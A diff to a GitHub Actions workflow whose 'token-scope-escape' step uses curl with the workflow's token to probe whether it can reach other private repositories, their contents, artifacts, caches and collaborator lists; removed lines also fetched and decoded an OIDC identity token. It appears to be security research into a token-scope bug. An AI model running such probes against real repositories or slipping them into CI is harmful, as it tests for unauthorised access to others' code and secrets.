@@ -3,30 +3,21 @@ on:
   workflow_dispatch:
 permissions:
   contents: read
-  id-token: write
   actions: read
 jobs:
   probe:
     runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
     steps:
       - name: token-scope-escape
         run: |
-          echo "=== GITHUB_TOKEN cross-repo scope test ==="
-          curl -s -o /dev/null -w "self repo (expect 200): %{http_code}\n" -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/aks-reviewes/xr-21516
-          curl -s -o /dev/null -w "SAME-owner OTHER priv repo mx-26313 (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/aks-reviewes/mx-26313
-          curl -s -o /dev/null -w "CROSS-owner aks-builds priv (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/aks-builds/idor-victim-28481
-          curl -s -o /dev/null -w "user/repos list (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user/repos
-          curl -s -o /dev/null -w "SAME-owner OTHER repo contents mx-26313 (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/aks-reviewes/mx-26313/contents/README.md
-      - name: oidc-claims
-        run: |
-          echo "=== OIDC token claims ==="
-          R=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=probe-aud")
-          TOK=$(echo "$R" | python3 -c "import sys,json;print(json.load(sys.stdin).get(\"value\",\"\"))")
-          PAY=$(echo "$TOK" | cut -d. -f2)
-          PAD=$(printf "%s" "$PAY" | awk "{l=length(\$0)%4; if(l>0) for(i=0;i<4-l;i++) \$0=\$0 \"=\"; print}")
-          echo "$PAD" | base64 -d 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print(\"sub:\",d.get(\"sub\"));print(\"aud:\",d.get(\"aud\"));print(\"repository:\",d.get(\"repository\"));print(\"iss:\",d.get(\"iss\"))" 2>/dev/null
-      - name: artifact-cross-repo
-        run: |
-          echo "=== GITHUB_TOKEN list OTHER repo artifacts/cache (escape if 200) ==="
-          curl -s -o /dev/null -w "aks-builds priv artifacts: %{http_code}\n" -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/aks-builds/idor-victim-28481/actions/artifacts
-          curl -s -o /dev/null -w "aks-reviewes mx-26313 caches: %{http_code}\n" -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/aks-reviewes/mx-26313/actions/caches
+          echo "=== GITHUB_TOKEN cross-repo scope test (token now present) ==="
+          curl -s -o /dev/null -w "self repo (expect 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-reviewes/xr-21516
+          curl -s -o /dev/null -w "SAME-owner OTHER priv mx-26313 (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-reviewes/mx-26313
+          curl -s -o /dev/null -w "SAME-owner contents mx-26313 (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-reviewes/mx-26313/contents/README.md
+          curl -s -o /dev/null -w "CROSS-owner aks-builds priv (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-builds/idor-victim-28481
+          curl -s -o /dev/null -w "user/repos list (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user/repos
+          curl -s -o /dev/null -w "SAME-owner artifacts mx-26313 (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-reviewes/mx-26313/actions/artifacts
+          echo "--- token identity ---"
+          curl -s -w " [%{http_code}]\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-reviewes/xr-21516/collaborators | python3 -c "import sys;d=sys.stdin.read();print(\"collab-count:\",d.count(\"login\"))" 2>/dev/null
